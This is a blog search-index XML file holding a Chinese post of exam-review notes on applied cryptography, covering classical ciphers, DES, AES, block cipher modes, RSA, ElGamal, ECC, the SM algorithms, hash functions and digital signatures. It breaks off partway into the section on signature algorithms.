<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>应用密码学</title>
      <link href="/post/645befba.html"/>
      <url>/post/645befba.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-总体大纲"><a href="#0-总体大纲" class="headerlink" title="0.总体大纲"></a>0.总体大纲</h1><p><img src="https://www.helloimg.com/images/2023/08/20/oSp49P.png" alt="image.png"></p><h1 id="1-密码学概念"><a href="#1-密码学概念" class="headerlink" title="1. 密码学概念"></a>1. 密码学概念</h1><p><strong>(1) 密码学的学科特点</strong></p><ol><li>数学基础：密码学是一门基于数学理论和算法的学科，需要熟练掌握数学知识。</li><li>多学科交叉：密码学不仅仅是数学学科，还涉及计算机科学、信息安全、电子工程等多个领域，需要跨学科合作。</li><li>应用广泛：密码学在现代社会中有着广泛的应用，如网络安全、电子商务、金融交易、政府通信等。</li><li>不断发展：随着计算机技术的不断进步，密码学也在不断发展，需要及时跟进最新的研究成果和技术进展。</li><li>安全性：密码学的主要目标是确保信息的机密性、完整性和可用性，因此安全性是其最重要的特点之一。</li></ol><p><strong>(2)研究的主要内容</strong><br>密码编码学和密码分析学<br>机密性、完整性、鉴别、抗抵赖</p><p><strong>(3)密码系统的安全条件:理论不可破详和实际不可破译，实际可用密码系统须具备的特性。</strong><br>略</p><p><strong>(4)掌握对密码系统的4种攻击方式的特点</strong><br>唯密文攻击（被动）这种攻击方式通常是密码分析中最困难的一种，因为攻击者只能通过分析密文的统计特性和密文的结构来猜测明文和密钥。需要攻击者拥有大量的密文和足够的时间和计算资源来破解密码系统<br>已知明文攻击（被动）攻击者已经知道了一部分的明文和密文，可以通过比对明文和密文之间的关系来推断出密钥。需要攻击者在攻击之前收集到一些明文和密文的对应关系。<br>选择明文攻击（主动）攻击者可以选择一些明文，获得对应的密文，以此来推断出密钥。可以选择任意的明文，可以更加精准地推断出密钥。需要攻击者能够向密码系统发送恶意的明文。<br>选择密文攻击（主动）攻击者可以选择一些密文，获得对应的明文或其他密文，以此来推断出密钥。需要攻击者能够向密码系统发送恶意的密文。</p><p><strong>(5) 正确理解密码系统安全性原则:“切秘密寓于密钥之中”</strong><br>（柯克霍夫斯(Kerckhoffs)原则）密码体制的安全性仅应依赖于对密钥的保密,而不应依赖于对算法的保密。只有在假设攻击者对密码算法有充分的研究,并且拥有足够的计算资源的情况下仍然安全的密码才是安全的密码系统。不把密码系统的安全性建立在算法保密性上,意味着密码算法可以公开,也可以被分析,即使攻击者知道密码算法也没有关系。</p><p><strong>(6) 两类重要密码体制，即对称密码体制和非对称密码体制的主要特点</strong><br><strong>对称密码体制</strong>（常规密码体制、秘密密钥密码体制）对明文&#x2F;密文变换时，加解密密钥相同，或可相互导出;<br>双方在通信前需要安全地协商共享密钥;<br>加解密算法效率较公开密码算法高;<br>系统开放性差，密钥管理复杂;<br>不能提供抗抵赖服务。</p><p><strong>非对称密码体制</strong> (公钥密码体制、公开密钥密码体制)对明文&#x2F;密文变换时，加解密密钥不相同，且不能由加密密钥(公钥，公开) 导出解密密钥 (私钥，保密);<br>系统开放性好，密钥管理较容易可提供抗抵赖服务（数字签名）<br>加解密运算复杂，效率低，不宜作数据加密.<br>存在特有的“可能报文攻击”的威胁。</p><p><strong>(7) 两种保密通信模型及原理</strong></p><ol><li><strong>点对点保密通信模型</strong></li></ol><p>是指通信双方之间进行加密通信，以保护通信内容的机密性和完整性。在点对点保密通信模型中，通信双方需要使用相同的密钥来进行加密和解密。<br>点对点保密通信模型的原理是基于对称加密算法，通信双方需要事先协商好一个密钥，并使用该密钥来进行加密和解密。在通信过程中，明文消息被加密成密文，只有使用正确的密钥才能将密文解密成明文。<br>点对点保密通信模型的优点是加解密速度快，但需要保证密钥的安全性。</p><ol start="2"><li><strong>多方保密通信模型</strong></li></ol><p>是指多个参与者之间进行加密通信，以保护通信内容的机密性和完整性。在多方保密通信模型中，每个参与者需要使用不同的密钥来进行加密和解密。<br>多方保密通信模型的原理是基于公钥加密算法和数字签名算法。在多方保密通信过程中，每个参与者都有自己的公钥和私钥，公钥用于加密和验证数字签名，私钥用于解密和签名。在通信过程中，每个参与者可以使用其他参与者的公钥来加密消息，只有使用正确的私钥才能解密消息。同时，参与者还可以使用自己的私钥对消息进行签名，以保证消息的真实性和完整性。<br>多方保密通信模型的优点是可以保证通信内容的机密性、完整性和真实性，但加解密速度较慢，并且需要管理多个密钥。</p><h1 id="2-古典密码技术"><a href="#2-古典密码技术" class="headerlink" title="2.古典密码技术"></a>2.古典密码技术</h1><p><strong>(1)替代密码与置换密码的概念与表示方法</strong></p><p><strong>替代（替换）密码</strong><br>•替代密码是指先建立一个替换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文，替代密码的密钥就是其替换表 ；<br>•根据密码算法加解密时使用替换表多少的不同，替代密码又可分为单表替代密码和多表替代密码。<br>单表替代密码: 密码算法加解密时使用一个固定的替换表；<br>多表替代密码: 密码算法加解密时使用多个替换表。</p><p><strong>置换密码</strong><br>•置换密码又称为换位密码；<br>•置换密码通过改变明文消息各元素的相对位置，但明文消息元素本身的取值或内容形式不变；<br>•在前面的替代密码中，则可以认为是保持明文的符号顺序，但是将它们用其它符号来替代。<br>置换密码在实质上是Hill密码的特例。所以置换密码属线性变换的密码。</p><p><strong>(2)单表替换密码、多表替换密码的概念</strong><br>单表替换密码：一般单表替代密码、移位密码、仿射密码、密钥短语密码<br>一般单表替代密码的原理是以26个英文字母集合上的一个置换π为密钥，对明文消息中的每个字母依次进行变换。<br><strong>·</strong>密钥空间K很大，|K|&#x3D;26!&#x3D;4×1026 ，破译者穷举搜索计算不可行，1微秒试一个密钥，遍历全部密钥需要1013年。<br><strong>·</strong>移位密码体制是替换密码体制的一个特例，它仅含26个置换做为密钥空间。<br><strong>·</strong>密钥_π_不便记忆。</p><p>多表替代密码的特点是使用了两个或两个以上的替代表。<br>多表替换密码：维吉尼亚密码、Hill密码、一次一密密码、Playfair密码</p><p><strong>(3)掌握 Hill 密码的特性与计算方法</strong><br>Hill密码算法的基本思想是通过线性变换将_n_个明文字母转换为_n_个密文字母。解密只需做一次逆变换即可。<br><img src="https://www.helloimg.com/images/2023/08/20/oSp99c.png" alt="image.png"></p><h1 id="3-机密性"><a href="#3-机密性" class="headerlink" title="3.机密性"></a>3.机密性</h1><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="分组密码"><a href="#分组密码" class="headerlink" title="分组密码"></a>分组密码</h3><h4 id="总体共性"><a href="#总体共性" class="headerlink" title="总体共性"></a>总体共性</h4><p>分组密码体制（Block cipher）是在密钥_k_控制下一次变换一个明文数据块的密码体制<br>具有速度快、易于标准化和便于软硬件实现等特点<br>在计算机通信和信息系统安全领域有着最广泛的应用</p><p>针对安全性的两个基本原则：<br>·混淆原则(Confusion) ：又称混乱原则、扰乱原则等，是指将密文、明文、密钥三者之间的统计关系和代数关系变得尽可能复杂<strong>（主要利用复杂的非线性替换算法）</strong><br>·扩散原则(Diffusion) ：将明文的统计规律和结构规律散射到相当长的一段统计中去<strong>（最简单的方法是迭代换位（置换））</strong><br><strong>乘积</strong>和<strong>迭代</strong>机制有助于实现混淆和扩散</p><p>分组加密算法的两个基本结构：<strong>SPN</strong>与<strong>Feistel</strong>：<br>SPN结构也是一种特殊的迭代密码 ，SPN结构和Feistel结构相比，可以得到更快速的扩散，但是SPN密码的加解密运算通常不完全相同。** **<br>Feistel 密码密文的任何一位均与明文和密钥的每一位相关；而明文和密钥的任何一位的变化将影响到尽量多的密文，其中函数 f 用于产生扩散和混淆作用，但并不要求为可逆函数；</p><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>数据分组长度、密文分组长度为<strong>64位</strong>，<br>使用的密钥为<strong>64位</strong>，但有效密钥长度为<strong>56位</strong>(有8位用于奇偶校验)。<br><strong>16轮</strong>迭代的Feistel密码算法。<br>       DES由初始置换，16轮迭代，初始逆置换组成<br>DES基本运算操作：置换、替换、异或与循环移位<br>解密算法和加密相同，但子密钥的使用顺序相反。<br>体制是公开的，系统的安全性完全靠密钥的保密<br><strong>S盒设计特点：</strong>(1) 任何S盒都不是输入变量的线性函数；<br>(2) S盒的每一行(除输入比特的最左和最右比特确定) 包括所有16种比特组合；<br>(3) 改变S盒的1个输入位，至少引起2位的输出变化；<br>(4）当固定S盒的1位输入时，S盒的每一位输出中0和1的个数尽可能平衡<br><strong>Festial结构特性</strong>主要优点：<br>1.设计容易: f 函数不要求可逆,  加、解密算法结构相同；<br>2.强度高：如果 f  函数是随机的，则连续若干轮复合形成的函数与随机置换是无法区分的.<br>主要缺点：</p><ol><li>每轮加密时输入有一半没有改变;</li><li>左右块的加密处理不能并行实施</li></ol><p>Feistel模型至少需要3轮才可实现完全性,  且当其F函数具有完全性时，只需3轮即可实现完全性，此时DES算法需且只需5轮即可实现完全性<br><img src="https://www.helloimg.com/images/2023/08/20/oSpOkq.png" alt="image.png"><br><strong>重点：DES算法的互补对称性</strong><img src="https://www.helloimg.com/images/2023/08/20/oSpdar.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/20/oSpvbT.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/20/oSpwI1.png" alt="image.png"></p><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>明文和密文长度<strong>128位</strong>，密钥长度可变(<strong>128&#x2F;192&#x2F;256位</strong>）<br>加解密使用不同的算法<br>置换、代替、代数运算<br>SP结构，基本轮函数迭代，迭代轮数可变(≥10)<br>字节替代 SubByte ()、行移位变换 ShiftRows()、列混合变换 MixColumns()、轮密钥加法 AddRoundKey()<br>ByteSub( )与ShiftRows( )运算次序可交换<br>列混合MixColumns()为线性变换</p><h4 id="分组密码的操作方式"><a href="#分组密码的操作方式" class="headerlink" title="分组密码的操作方式"></a>分组密码的操作方式</h4><h5 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h5><p>将每块明文加密成相应的密码块，若最后一块不足64bit，则用一些任意二进制序列填充<br>特点 ：  (1)  一种最简易的工作方式；<br>(2) 相同密钥作用下，密文块与明文块一一对应，易于暴露明文的固有格式；<br>                    (3) 各密文块间缺乏相关性，信息易于受到块替换攻击 </p><h5 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h5><p>加入反馈机制，当前明文块在加密之前要与前面的密文块进行异或<br>特点 ：  (1) 同一明文块会产生不同的密文块；<br>(2) 有误码扩散，若Ci在传送过程中出错，则解密时会造成mi和mi+1两个明文块都出错，<br>但后面的密文块仍然能自动正确恢复；<br>                    (3) 只有当所有64比特块到达后才能开始编解码</p><h5 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h5><p>为克服CBC方式的第(3)个问题，数据是按比分组小得多的单位进行加密的，密文依赖于前面所有的明文<br>特点 ：  (1) 移位寄存器的的内容与明文整个以前的历史有关，同样需要一个初始向量（寄存器初值）；<br>(2) 将分组密码转换为流密码（序列密码），实现即时加密； </p><h5 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h5><p>与CFB模式相似，但它是在块内部进行反馈，其反馈机制既不依赖明文也不依赖密文流<br>特点 ：  (1) 没有误码扩散，适用于传输信息长度变化较大的数据，如语音、图像等。<br>(2) 比CFB更易受对消息流的篡改，攻击者对密文的篡改难以检测。<br>(3) 链接相关性，密文与前面的明文无关。<br>(4) 应用时要求一次一密方式 (OTP，One-Time Pad)</p><h5 id="CTR（计数器模式）"><a href="#CTR（计数器模式）" class="headerlink" title="CTR（计数器模式）"></a>CTR（计数器模式）</h5><p>特点 ：  (1)具有随机访问特性，可随机对任意一个密文分组进行解密处理；<br>(2)处理效率高，可进行并行处理，提高数据吞吐量；<br>(3)同一明文块会产生不同的密文块；<br>(4)可提前进行预处理；<br>(5) 实现简单，加、解密阶段都只涉及加密函数。</p><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>二重DES的加密，所用密钥的长度为 ：<br>56×2&#x3D;112 bits，二重DES很难抵挡住中间相遇攻击法 </p><p>到目前为止，还没有人给出攻击三重DES的有效方法，相对于单一DES来说，复杂性以指数形式增长。</p><h4 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h4><p>是对64bit大小的数据块加密的分组加密算法，密钥长度为128位<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1685713758611-d9747475-9d39-4822-901b-d0d4948f583f.png#averageHue=%238fc5ef&clientId=u435b6b3e-152a-4&from=paste&height=154&id=u36f4213e&originHeight=243&originWidth=791&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=50541&status=done&style=none&taskId=u20956ac1-61a2-40dc-89aa-e34a3df1373&title=&width=502.22224502967254" alt="image.png"></p><p>IDEA与DES的比较：<br>共同点：同属分组密码体制（分组长度也为64比特）<br>不同点：（1）IDEA密钥长度128位；<br>（2） IDEA的加解密子密钥不完全相同（但可相互导出）;<br>（3） IDEA可用软硬件实现，但倾向于软件实现；<br>（4） DES为Feistel结构，而IDEA不是。</p><h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>RC5加密明文块的长度为32，64，128 bits。并且对应同样长度的密文。密钥长度为从8到2040 bits<br><img src="https://www.helloimg.com/images/2023/08/20/oSpQAb.png" alt="image.png"></p><h4 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h4><p><strong>·</strong>加解密算法及密钥扩展都采用32轮非线性迭代结构。<br><strong>·</strong>数据分组长度、密钥长度&#x3D;128位（16Byte）<br><strong>·</strong>算法具有对合特性：解密算法和加密算法结构相同，只是轮密钥反序使用（与DES类似）<br><strong>·</strong>密码结构：非对称Feistel结构</p><h3 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h3><p>序列密码又称为流密码（stream cipher），它是一种对称密码体制，<br>特点：<br>l 明文消息按字符或比特逐位进行加密；<br>l 基于硬件电路实现，如链路密码机；<br>l 实现简单，加解密处理速度快；<br>l 没有或只有有限的错误传播;<br>l 多用于军事和外交等特殊通信领域。</p><p>密钥流序列具有如下性质：<br>Ø极大的周期<br>Ø良好的统计特性<br>Ø抗线性分析</p><h4 id="同步序列密码"><a href="#同步序列密码" class="headerlink" title="同步序列密码"></a><strong>同步序列密码</strong></h4><p>系统内部记忆元件的状态独立于明文或密文的叫做同步流密码，否则叫自同步流密码。<br>分组密码的<strong>OFB</strong>模式就是一个同步序列加密的例子。<br>特点：<br>l 无错误传播<br>l 有同步要求</p><h4 id="自同步序列密码"><a href="#自同步序列密码" class="headerlink" title="自同步序列密码"></a><strong>自同步序列密码</strong></h4><p>密钥流的产生与己经产生的一定数量的密文有关。<br>分组密码的<strong>CFB</strong>模式就是一个自同步序列加密的例子。<br>特点：<br>l 密钥流的产生与密文有关<br>l 有限错误传播<br>l 自同步</p><h4 id="LFSR-线性反馈移位寄存器"><a href="#LFSR-线性反馈移位寄存器" class="headerlink" title="LFSR-线性反馈移位寄存器"></a>LFSR-<strong>线性反馈移位寄存器</strong></h4><p>定义如果一个GF(2)上的n阶反馈移位寄存器的反馈函数形如<br>            <img src="https://www.helloimg.com/images/2023/08/20/oSppNo.png" alt="image.png"><br>其中ci∈GF(2)，1≤i≤n，则称其为线性反馈移位寄存器。否则，称其为非线性反馈移位寄存器。<br>            <img src="https://www.helloimg.com/images/2023/08/20/oSpzjD.png" alt="image.png"></p><p>如果直接用线性移位寄存器序列作为密钥序列，则在已知明文攻击的情况下，相应的序列密码体制是很不安全的。<br>可以对一个或多个线性移位寄存器序列进行非线性组合来获得在序列密码中安全性良好的非线性序列</p><p>基于LFSR的序列密码生成器:<br>Geffe生成器<br>钟控生成器<br>交错停走式生成器</p><h4 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h4><p>密钥长度可变的流加密算法簇<br>其核心部分的S-box长度可为任意，但一般为256字节。<br>RC4算法的原理较简单，主要有两个算法：<br>（1）密钥调度算法KSA<br>（2）伪随机数生成算法PRGA</p><p>密钥调度算法的作用是将一个随机密钥（典型大小是40位~256位）变换成一个初始置换，即相当于初始化状态矢量S，然后伪随机数生成算法PRGA利用该初始置换生成一个伪随机输出序列。<br>加密时，将K的值与下一个明文字节异或；<br>解密时，将K的值与下一个密文字节异或。<br>为了保证安全强度，目前的RC4至少使用128位的密钥。</p><h2 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>公钥密码又称为双钥密码和非对称密码，是1976年由Diffie和Hellman提出</p><p>对公钥密码的要求  ：<br>(1) 生成密钥对的计算很容易；<br>(2) 发送方A用接收方B的公钥PKB生成密文c，计算上是容易的。 c &#x3D; EPKB(m)<br>(3)接收方B用自己的私钥SKB对 c 解密，在计算上是容易的。 m &#x3D; DSKB (c) &#x3D; DSKB(EPKB(m))<br>(4)攻击者通过B的公钥PKB计算出私钥SKB在计算上不可行。<br>(5)攻击者通过B的公钥PKB和密文c还原明文m在计算上不可行。<br><img src="https://www.helloimg.com/images/2023/08/20/oSpDES.png" alt="image.png"></p><blockquote><p><strong>三类算法: RSA, ElGamal, ECC</strong><br><strong>(1) RSA</strong><br><strong>–基础: IFP(Integer Factorization Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>–使用最广泛</strong><br><strong>(2)ElGamal</strong><br><strong>–基础: DLP(Discrete Logarithm Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>(3)ECC</strong><br><strong>–基础: ECDLP(Elliptic Curve Discrete Logarithm Problem)</strong><br><strong>–加&#x2F;解密、密钥交换、数字签名</strong><br><strong>–密钥短，速度快</strong><br>**  –已开始广泛应用**</p></blockquote><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA的基本性质 ：<br>（1）加密和解密运算具有可交换性<br>（2）加解密算法的有效性<br>（3）在计算上由公开的加密密钥不能求出解密密钥<br>RSA的算法描述 ：<br><img src="https://www.helloimg.com/images/2023/08/20/oSpIOC.png" alt="image.png"></p><p><img src="https://www.helloimg.com/images/2023/08/20/oSp6kQ.png" alt="image.png"></p><h4 id="ElGamma"><a href="#ElGamma" class="headerlink" title="ElGamma"></a>ElGamma</h4><p>密文空间大于明文空间。明文空间为Zp<em>，而密文空间为 Zp</em>× Zp<em>，也即对于每个明文，其密文由2个Zp</em>上的元素组成<br>ElGamal加密体制通过明文 m乘以yBk掩盖明文，产生c2 ；同时值c1 &#x3D; ak也作为密文的一部分进行传送。<br><img src="https://www.helloimg.com/images/2023/08/20/oSpgIv.png" alt="image.png"><br>ElGamal公开密钥密码算法的安全性建立在<strong>计算Zp上离散对数的困难性上</strong><br>要使用不同的随机数k来加密不同的信息<br>随机数k不可预测</p><p><img src="https://www.helloimg.com/images/2023/08/20/oSpK1t.png" alt="image.png"></p><h4 id="ECC-椭圆曲线密码体制"><a href="#ECC-椭圆曲线密码体制" class="headerlink" title="ECC-椭圆曲线密码体制"></a>ECC-椭圆曲线密码体制</h4><p>“椭圆曲线”并非一定是椭圆，是指由二元三次方程：<br><img src="https://www.helloimg.com/images/2023/08/20/oSprRE.png" alt="image.png"><br> 所描述的曲线<br><img src="https://www.helloimg.com/images/2023/08/20/oSpVAY.png" alt="image1.png"></p><h4 id="M-V"><a href="#M-V" class="headerlink" title="M-V"></a>M-V</h4><p>M－V 公钥密码体制即是在椭圆曲线上的一个有效实现<br><img src="https://www.helloimg.com/images/2023/08/20/oSpYN9.png" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/08/20/oSpfuX.png" alt="image.png"></p><h4 id="SM2"><a href="#SM2" class="headerlink" title="SM2"></a>SM2</h4><p>SM2是一种基于椭圆曲线密码学的公钥密码算法，由中国密码标准化工作组推荐<br>SM2算法的主要内容包括３部分：<br>数字签名算法；密钥交换协议；公钥加密算法；<br><strong>SM2算法的特点</strong>如下：</p><ol><li>安全性高：SM2算法采用了椭圆曲线密码学中的离散对数问题，能够提供较高的安全性。</li><li>签名速度快：SM2算法的签名速度比传统RSA算法要快，适合用于大量数据的签名操作。</li><li>密钥长度短：SM2算法的密钥长度比传统RSA算法要短，节省了存储空间和传输带宽。</li><li>支持国密标准：SM2算法是中国国家密码局发布的国家密码算法标准，符合国密要求，</li><li>公开透明：SM2算法设计和安全性分析是公开透明的，有助于对算法的安全性进行评估和验证。</li></ol><h1 id="4-完整性"><a href="#4-完整性" class="headerlink" title="4.完整性"></a>4.完整性</h1><p>鉴别是通过验证用户或实体的身份以确保其合法性的过程可以将鉴别分为两种类型：报文鉴别和实体鉴别。</p><ol><li>报文鉴别：报文鉴别是指通过加密算法或哈希算法对报文进行处理，生成报文的认证码或数字签名，并将其附加在报文中，以确保报文的完整性和真实性。</li><li>实体鉴别：实体鉴别是指验证通信实体的身份，以确保通信双方的身份认证和数据传输安全。</li></ol><h2 id="报文鉴别"><a href="#报文鉴别" class="headerlink" title="报文鉴别"></a>报文鉴别</h2><h3 id="基于加密"><a href="#基于加密" class="headerlink" title="基于加密"></a>基于加密</h3><p>略</p><h3 id="基于hash"><a href="#基于hash" class="headerlink" title="基于hash"></a>基于hash</h3><p><strong>（1）密码散列函数的概念和6个基本性质</strong><br>密码学中的散列函数又称为哈希函数(Hash函数)杂凑函数，它是一种单向密码体制,是一个从明文到密文的不可逆映射,只有加密过程,没有解密过程。<br>设散列函数为h(m)，其有以下基本特性:<br>(1)h(m)算法公开,不需要密钥。<br>(2)具有数据压缩功能，可将任意长度的输入数据转换成一个周定长度的输出。<br>(3)对任何给定的 m,h(m)易于计算<br>(4)具有单向性。给定消息的散列值h(m),要得到消息m在计算上不可行;<br>(5)具有弱抗碰撞性(Weak Collision Resistance,也称弱抗冲突性)。对任何给定的消息m,寻找与m 不同的消息m使得它们的散列值相同即h(m)&#x3D;h(m),在计算上不可行。<br>(6)具有强抗碰撞性(Strong Collision Resistance,也称强抗冲突性)寻找任意两个不同的消息m和m使得h(m)-h(m)在计算上不可行。</p><p><strong>（2) 理解哈希函数的抗碰撞安全性</strong><br>所谓散列函数的碰撞是指若两个消息m与m’，m不等于m’，但它们的散列值相等,即h(m)&#x3D;h(m’)，那么，则把这种情况称为发生了碰撞或冲突。由于输入消息的长度可以是任意的,但散列函数输出的散列值的长度是固定的,如对于散列值长度为160位的散列函数而言,可能的散列值总数为 2^160。显然,不同的消息就有可能会产生相同的散列值，即散列函数具有碰撞的不可避免性。但是,散列算法的安全性要求找到一个碰撞在计算上是不可行的。也就是说,要求碰撞是不可预测的,攻击者不能指望对输入消息的预期改变可以得到一个相同的散列值。</p><p>**  (3)散列函数的基本应用方式（基于散列函数的 6 种报文鉴别方式，掌握 P93，图 5.16)**<br>利用密码技术设计提供信息的机密性、完整性和可鉴别性服务的信息安全传输方案<br><img src="https://www.helloimg.com/images/2023/08/20/oSpjEg.jpg" alt="d1521d574531184574d6b05ff1c170c.jpg"><br>**  (4) 单向散列函数的设计、构造问题**<br><strong>简单的散列函数的不安全性</strong></p><ol><li>易于碰撞攻击：简单的散列函数通常使用较短的散列值，因此很容易出现碰撞，即不同的输入数据产生相同的散列值。攻击者可以利用碰撞来欺骗系统，从而执行未经授权的操作。</li><li>易于彩虹表攻击：攻击者可以构建彩虹表，其中包含了所有可能的输入数据及其对应的散列值。然后，攻击者可以将目标散列值与彩虹表中的散列值进行比较，以找到对应的输入数据。</li><li>易于字典攻击：攻击者可以使用已知的密码字典或常见密码列表来生成散列值，并将其与目标散列值进行比较。由于简单的散列函数通常使用较弱的算法，因此很容易受到字典攻击的影响。</li><li>易于生日攻击：如果散列函数的输出长度较短，攻击者可以使用生日攻击来寻找碰撞。生日攻击利用概率学原理，在较短的时间内就能找到相同的散列值。</li></ol><p><strong>散列函数的生日攻击问题</strong><br>与散列函数相关的类似问题可表述如下：给定一个散列函数h的输出长度为m位，共有2^m个可能的散列值输出，如果让散列函数h接收k个随机输入产生集合X,再使用另外k个随机输入产生集合Y,问必须为多大才能使两个集合产生相同散列值输出的概率大于0.521<br>这时,n&#x3D;2^m,由式(5.3)有：<br><img src="https://www.helloimg.com/images/2023/08/20/oSpuOM.png" alt="image.png"></p><p>这种寻找散列函数h的具有相同输出的两个任意输入的攻击方式称为生日攻击。<br>下面举一个简单的示例来说明这种针对散列函数的生日攻击过程。还是假设 Alice是一家计算机公司的总经理，要从Bob的公司购买一批计算机。经过双方协商,确定了5000 元&#x2F;台的价格,于是 Bob 发来合同的电子文本征得 Alice 的同意，Alice确认后计算出这一合同文本的散列值，用自己的私钥进行数字签名并发回给 Bob,以此作为 Alice对合同样本的确认。<br>但是,Bob在发给Alice 合同样本前，首先写好一份正确的合同,然后标出这份合同中无关紧要的地方。由于合同总是由许许多多的句子构成的,而这些句子往往可以有很多不同的表达方式,所以一份合同总可以有很多种不同的说法,却都能表达同样的意思。现在Bob只要把这些意思相同的合同都列出来作为一组，然后再把每一份合同当中标明的价格从5000元&#x2F;台改为10000元&#x2F;台，并且把修改过的合同也集中起来作为另外一组，这样他的手中就有了两组合同:一组的价格条款都是 5000元&#x2F;台的，而另一组的价格都是 10000元&#x2F;台然后，Bob只要把这两组合同的散列值都计算一遍，从当中挑出一对散列值相同的,把这一对当中的那份写明5000元&#x2F;台的合同作为合同样本给Alice，并交由Alice进行签名而自己则偷偷把那份10000元&#x2F;台的合同藏起来，以便在将来进行欺诈。<br>从生日攻击的理论上来讲,如果假设上述事例使用的散列函数输出为64位,那么 Bob只要找到合同中32个无关紧要的地方,来分别构成5000元&#x2F;台和10000元&#x2F;台两组合同，有0.5以上的概率能在这两组合同中找到碰撞,来实现他的诈骗行为。</p><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>略</p><h4 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h4><p>输入：最大长度为264-1位的消息；<br>输出：160位消息摘要；<br>处理：输入以512位数据块为单位处理</p><h4 id="SHA-256"><a href="#SHA-256" class="headerlink" title="SHA-256"></a>SHA-256</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1687268590933-752c9a3d-2199-4c94-9e58-3b547709c2e1.png#averageHue=%23d4eaf5&clientId=u17e51720-26c7-4&from=paste&height=137&id=ue69452ef&originHeight=215&originWidth=1015&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41253&status=done&style=none&taskId=uaa1fb1c5-22b6-4a3e-a9f0-f292db9fae8&title=&width=644.4444737106418" alt="image.png"></p><h4 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h4><h4 id="SM3密码杂凑算法的设计主要遵循以下原则"><a href="#SM3密码杂凑算法的设计主要遵循以下原则" class="headerlink" title="SM3密码杂凑算法的设计主要遵循以下原则:"></a>SM3密码杂凑算法的设计主要遵循以下原则:</h4><ol><li>能够有效抵抗比特追踪法及其他分析方法;</li><li>软硬件实现需求合理;</li><li>在保障安全性的前提下，综合性能指标与SHA-256同等条件下相当</li></ol><h2 id="数字签名（实体鉴别）"><a href="#数字签名（实体鉴别）" class="headerlink" title="数字签名（实体鉴别）"></a>数字签名（实体鉴别）</h2><p><strong>(1) 数字签名的概念，基本特性</strong><br>数字签名实际上是一个把数字形式的消息和某个源发实体相联系的数据串，把它附加在一个消息或完全加密的消息上,以便于消息的接收方能够鉴别消息的内容，并证明消息只能源发于所声称的发送方。<br>迅速的、远距离的、更高的安全性<br>(1)签名是不可伪造的。<br>(2)签名是不可抵赖的。<br>(3)签名是可信的。<br>(4)签名是不可复制的。<br>(5)签名的消息是不可篡改的。</p><p><strong>(2) 数字签名两种执行方式</strong><br><strong>1.直接方式</strong><br>直接方式是指数字签名的执行过程只有通信双方参与，并假定双方有共享的秘密密钥，或者接收一方知道发送方的公开密钥。例如消息接收者可以获得消息发送者的公钥,发送者用其自己的私钥对整个消息或者消息散列码进行签名来形成数字签名。直接数字签名有一些共同的缺点:方案的有效性依赖于发送方秘密密钥的安全性。如果发送方想对已发出的消息予以否认,就可以声称自己的秘密密钥已丢失或者被盗，因此自己的数字签名是他人伪造的。可以采取某些行政管理手段,虽然不能避免,但可在某种程度上减弱这种威胁。例如,要求每一个被签名的消息都包含一个时间戳,标明消息被签名的日期和时间,并要求秘密密钥一旦丢失,就要立即向管理机构报告。但这种方式的数字签名仍然存在着假冒签名的威胁,假设发送方的秘密密钥在时间T被窃取，攻击者可以伪造一个消息,用发送方的秘密密钥对其签名并加上丁以前的时间戳。<br><strong>2.具有仲裁的方式</strong><br>具有仲裁的数字签名是在通信双方的基础上引人了第三方仲裁者参与。通常的做法是所有从发送方到接收方的签名消息首先送到仲裁者，仲裁者将消息及其数字签名进行一系列的测试，以检查其来源和内容,并将消息加上时间戳,与已被仲裁者验证通过的数字签名一起发送给接收方。在这种方式下,仲裁者扮演裁判的角色,起着重要作用并应取得所有的参与者的信任。下面给出几个需要仲裁者的数字签名方案。其中S表示发送方,R表示接收方,A是仲裁者，m是传送的消息。<br>方案一:对称加密,仲裁者可以看到消息内容<br>方案二:对称加密，仲裁者不能看到消息内容<br>方案三:公钥加密，仲裁者不能看到消息内容</p><p><strong>(3)数字签名的应用过程</strong><br>（1）系统的初始化过程：产生的数字签名方案中用到的一切参数，有公开的，也有秘密的。<br>（2）签名产生过程：此过程用户利用给定的算法对消息产生签名，这种签名过程可公开也可不公开。<br>（3）签名验证过程：验证者利用公开验证方法对给定消息的签名进行验证，得出签名的有效性。</p><p><strong>(4) 热练掌握典型公明密码体制的数字签名算法(RSA、EIGamal、ECDSA)原理、计方法与应用</strong><br><strong>ElGamal:</strong><br><img 